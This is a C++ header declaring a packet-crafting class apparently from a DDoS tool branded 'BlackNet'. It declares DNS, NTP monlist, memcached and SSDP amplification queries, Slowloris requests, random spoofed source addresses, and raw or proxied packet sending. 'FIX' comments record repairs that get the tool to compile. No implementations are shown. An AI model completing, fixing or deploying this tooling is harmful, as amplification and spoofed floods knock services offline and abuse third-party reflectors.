#ifndef PROTOCOL_HANDLER_H
#define PROTOCOL_HANDLER_H

#include <string>
#include <vector>
#include <cstdint>      // FIX: added for uint8_t, uint16_t, uint32_t
#include <cstddef>      // FIX: added for size_t
#include <utility>      // FIX: added for std::pair
#include <random>       // FIX: added for std::mt19937 (was missing — caused compile error)

class ProtocolHandler {
public:
    // Protocol types
    enum Protocol {
        UDP,
        TCP,
        HTTP,
        HTTPS,
        ICMP,
        DNS,
        NTP,
        MEMCACHED,
        SSDP,
        SLOWLORIS
    };

    // Packet structure
    struct Packet {
        std::vector<uint8_t> data;
        Protocol protocol;
        std::string source_ip;
        std::string dest_ip;
        uint16_t source_port;
        uint16_t dest_port;
    };

    // Constructor/Destructor
    ProtocolHandler();
    ~ProtocolHandler();

    // Packet creation
    Packet create_udp_packet(const std::string& src_ip, uint16_t src_port,
                             const std::string& dst_ip, uint16_t dst_port,
                             const std::vector<uint8_t>& payload);

    Packet create_tcp_syn_packet(const std::string& src_ip, uint16_t src_port,
                                 const std::string& dst_ip, uint16_t dst_port,
                                 uint32_t seq_num = 0, uint32_t ack_num = 0);

    Packet create_tcp_ack_packet(const std::string& src_ip, uint16_t src_port,
                                 const std::string& dst_ip, uint16_t dst_port,
                                 uint32_t seq_num, uint32_t ack_num);

    Packet create_tcp_fin_packet(const std::string& src_ip, uint16_t src_port,
                                 const std::string& dst_ip, uint16_t dst_port,
                                 uint32_t seq_num, uint32_t ack_num);

    Packet create_tcp_rst_packet(const std::string& src_ip, uint16_t src_port,
                                 const std::string& dst_ip, uint16_t dst_port,
                                 uint32_t seq_num, uint32_t ack_num);

    Packet create_icmp_packet(const std::string& src_ip, const std::string& dst_ip,
                              uint8_t type, uint8_t code,
                              const std::vector<uint8_t>& payload);

    Packet create_icmp_echo_request(const std::string& src_ip, const std::string& dst_ip,
                                    uint16_t id, uint16_t seq,
                                    const std::vector<uint8_t>& payload);

    Packet create_icmp_echo_reply(const std::string& src_ip, const std::string& dst_ip,
                                  uint16_t id, uint16_t seq,
                                  const std::vector<uint8_t>& payload);

    Packet create_http_request(const std::string& method, const std::string& url,
                               const std::string& host, const std::string& user_agent,
                               const std::vector<std::pair<std::string, std::string>>& headers = {},
                               const std::vector<uint8_t>& body = {});

    Packet create_http_get(const std::string& url, const std::string& host,
                           const std::string& user_agent = "BlackNet/1.0",
                           const std::vector<std::pair<std::string, std::string>>& headers = {});

    Packet create_http_post(const std::string& url, const std::string& host,
                            const std::string& user_agent = "BlackNet/1.0",
                            const std::vector<std::pair<std::string, std::string>>& headers = {},
                            const std::vector<uint8_t>& body = {});

    Packet create_http_head(const std::string& url, const std::string& host,
                            const std::string& user_agent = "BlackNet/1.0",
                            const std::vector<std::pair<std::string, std::string>>& headers = {});

    Packet create_dns_query(const std::string& domain, uint16_t query_type = 1);
    Packet create_dns_amplification_query(const std::string& domain, uint16_t query_type = 255);

    Packet create_ntp_monlist_query();
    Packet create_ntp_amplification_query();

    Packet create_memcached_stats_query();
    Packet create_memcached_amplification_query(const std::vector<uint8_t>& payload);

    Packet create_ssdp_discovery_query();
    Packet create_ssdp_amplification_query();

    Packet create_slowloris_request(const std::string& host, const std::string& path = "/",
                                    const std::string& user_agent = "BlackNet/1.0");

    // Packet sending
    bool send_packet(const Packet& packet, bool use_proxy = false,
                     const std::string& proxy_ip = "", uint16_t proxy_port = 0);

    bool send_packet_raw(const Packet& packet);
    bool send_packet_through_proxy(const Packet& packet,
                                   const std::string& proxy_ip, uint16_t proxy_port);

    // Protocol utilities
    static uint16_t calculate_checksum(const uint8_t* data, size_t length);
    static std::string generate_random_ip();
    static uint16_t generate_random_port();
    static std::vector<uint8_t> generate_random_payload(size_t size);
    static std::string generate_random_mac();
    static uint32_t generate_random_ip_int();

    // Validation
    static bool validate_ip(const std::string& ip);
    static bool validate_port(uint16_t port);
    static bool validate_mac(const std::string& mac);

    // Conversion
    static uint32_t ip_to_int(const std::string& ip);
    static std::string int_to_ip(uint32_t ip);
    static std::string mac_to_string(const uint8_t* mac);
    static void string_to_mac(const std::string& mac_str, uint8_t* mac);

private:
    // Checksum helpers (non-static — operate on instance context)
    uint16_t calculate_ip_checksum(const uint8_t* data, size_t length);
    uint16_t calculate_tcp_checksum(const uint8_t* ip_header, const uint8_t* tcp_header,
                                    size_t tcp_len,
                                    const uint8_t* payload = nullptr, size_t payload_len = 0);
    uint16_t calculate_udp_checksum(const uint8_t* ip_header, const uint8_t* udp_header,
                                    size_t udp_len,
                                    const uint8_t* payload = nullptr, size_t payload_len = 0);
    uint16_t calculate_icmp_checksum(const uint8_t* icmp_header, size_t icmp_len,
                                     const uint8_t* payload = nullptr, size_t payload_len = 0);

    // Packet building helpers
    void build_ip_header(uint8_t* buffer,
                         const std::string& src_ip, const std::string& dst_ip,
                         uint8_t protocol, uint16_t total_len,
                         uint16_t id = 0, uint8_t ttl = 64);

    void build_tcp_header(uint8_t* buffer, uint16_t src_port, uint16_t dst_port,
                          uint32_t seq, uint32_t ack, uint8_t flags,
                          uint16_t window = 5840,
                          const uint8_t* options = nullptr, size_t options_len = 0);

    void build_udp_header(uint8_t* buffer, uint16_t src_port,
                          uint16_t dst_port, uint16_t len);

    void build_icmp_header(uint8_t* buffer, uint8_t type, uint8_t code,
                           uint16_t id = 0, uint16_t seq = 0);

    // DNS helper
    std::vector<uint8_t> encode_dns_name(const std::string& domain);

    // FIX: std::mt19937 requires <random> — include was missing in original
    std::mt19937 rng;
};

#endif // PROTOCOL_HANDLER_H
